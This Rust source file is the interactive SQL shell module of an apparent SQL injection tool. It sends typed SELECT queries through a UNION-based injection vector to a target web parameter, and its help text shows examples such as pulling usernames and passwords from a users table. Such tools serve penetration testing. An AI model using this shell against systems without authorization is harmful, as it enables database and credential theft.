//! Interactive SQL shell for manual query execution

use crate::http::client::HttpClient;
use crate::sqli::techniques::union::{UnionVector, union_use};
use crate::sqli::request::Request;
use anyhow::Result;
use std::io::{self, Write};
use url::Url;

/// Interactive SQL shell
pub struct SqlShell<'a> {
    client: &'a HttpClient,
    url: Url,
    parameter: String,
    vector: UnionVector,
}

impl<'a> SqlShell<'a> {
    pub fn new(client: &'a HttpClient, url: Url, parameter: String, vector: UnionVector) -> Self {
        Self {
            client,
            url,
            parameter,
            vector,
        }
    }

    /// Run interactive SQL shell
    pub async fn run(&self) -> Result<()> {
        println!("\n[*] Starting SQL shell...");
        println!("[*] Type 'exit' or 'quit' to leave");
        println!("[*] Type 'help' for available commands\n");

        loop {
            print!("sql-shell> ");
            io::stdout().flush()?;

            let mut input = String::new();
            io::stdin().read_line(&mut input)?;
            let input = input.trim();

            if input.is_empty() {
                continue;
            }

            match input.to_lowercase().as_str() {
                "exit" | "quit" | "q" => {
                    println!("[*] Exiting SQL shell...");
                    break;
                }
                "help" | "?" => {
                    self.print_help();
                }
                "info" => {
                    self.print_info();
                }
                _ => {
                    // Execute SQL query
                    match self.execute_query(input).await {
                        Ok(results) => {
                            if results.is_empty() {
                                println!("[*] No results returned");
                            } else {
                                for row in results {
                                    println!("{}", row);
                                }
                            }
                        }
                        Err(e) => {
                            println!("[!] Error: {}", e);
                        }
                    }
                }
            }
            println!();
        }

        Ok(())
    }

    /// Execute a SQL query and return results
    async fn execute_query(&self, query: &str) -> Result<Vec<String>> {
        let request = Request::new(self.client, self.url.clone(), self.parameter.clone());
        
        // Ensure query starts with SELECT
        let full_query = if query.to_uppercase().starts_with("SELECT ") {
            query.to_string()
        } else {
            format!("SELECT {}", query)
        };

        union_use(&request, &self.vector, &full_query).await
    }

    fn print_help(&self) {
        println!("Available commands:");
        println!("  SELECT ...     Execute a SELECT query");
        println!("  VERSION()      Get database version");
        println!("  DATABASE()     Get current database");
        println!("  USER()         Get current user");
        println!("  info           Show injection info");
        println!("  help           Show this help");
        println!("  exit/quit      Exit the shell");
        println!();
        println!("Examples:");
        println!("  SELECT VERSION()");
        println!("  SELECT user,pass FROM users");
        println!("  SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE()");
    }

    fn print_info(&self) {
        println!("Injection Info:");
        println!("  URL: {}", self.url);
        println!("  Parameter: {}", self.parameter);
        println!("  DBMS: {}", self.vector.dbms);
        println!("  Columns: {}", self.vector.count);
        println!("  Position: {}", self.vector.position);
    }
}
